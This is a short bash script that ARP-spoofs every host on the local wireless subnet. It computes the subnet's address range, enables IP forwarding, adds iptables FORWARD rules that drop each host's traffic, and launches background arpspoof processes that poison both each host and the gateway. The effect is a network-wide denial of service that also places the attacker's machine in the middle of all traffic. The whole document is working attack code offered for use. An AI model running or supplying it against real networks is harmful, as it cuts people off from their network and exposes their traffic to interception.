#!/bin/bash

INTERFACE="wlan0"
GATEWAY=$(ip route | grep default | awk '{print $3}')
MYIP=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f1)
NETWORK_CIDR=$(ip addr show $INTERFACE | grep 'inet ' | awk '{print $2}')

# Get first and last usable IP
HOSTMIN=$(ipcalc "$NETWORK_CIDR" | grep HostMin | awk '{print $2}')
HOSTMAX=$(ipcalc "$NETWORK_CIDR" | grep HostMax | awk '{print $2}')

# IP to decimal
ip2dec() {
    IFS=. read -r a b c d <<< "$1"
    echo "$(( (a << 24) + (b << 16) + (c << 8) + d ))"
}

# Decimal to IP
dec2ip() {
    local dec=$1
    echo "$(( (dec >> 24) & 255 )).$(( (dec >> 16) & 255 )).$(( (dec >> 8) & 255 )).$(( dec & 255 ))"
}

MIN=$(ip2dec "$HOSTMIN")
MAX=$(ip2dec "$HOSTMAX")

# Enable IP forwarding for routing (if desired)
echo 1 > /proc/sys/net/ipv4/ip_forward

for (( i=$MIN; i<=$MAX; i++ )); do
    IP=$(dec2ip $i)
    if [[ "$IP" != "$MYIP" && "$IP" != "$GATEWAY" ]]; then

        # Block traffic 
        iptables -A FORWARD -s "$IP" -j DROP
        iptables -A FORWARD -d "$IP" -j DROP
        # Propagate ARP spoofing to this IP
        arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
    fi
done

echo "ARP spoofing all IPs in $NETWORK_CIDR except $MYIP and $GATEWAY."
echo "Press Ctrl+C to stop."
